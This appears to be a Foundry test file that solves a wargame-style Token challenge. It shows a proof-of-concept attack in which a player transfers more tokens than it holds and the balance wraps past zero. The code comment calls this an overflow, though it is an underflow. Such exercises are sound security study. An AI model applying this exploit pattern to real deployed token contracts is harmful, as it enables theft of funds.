//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Token} from "src/level9.sol";
import {Test, console} from "forge-std/Test.sol";

contract TokenTest is Test {
    Token public token;
    address public player = makeAddr("player");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(player, 1 ether);
        vm.deal(attacker, 1 ether);
        vm.startPrank(player);
        token = new Token(20);
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(player);
        //initial balance of token contract
        assertEq(token.balanceOf(player), 20);
        bool success = token.transfer(attacker, 21);
        assertTrue(success);
        //balance of token contract after transfer
        //here arithmetic overflow is happen
        uint256 _balanceofplayer = token.balanceOf(player);
        assertGt(_balanceofplayer, 20);

        vm.stopPrank();
    }
}
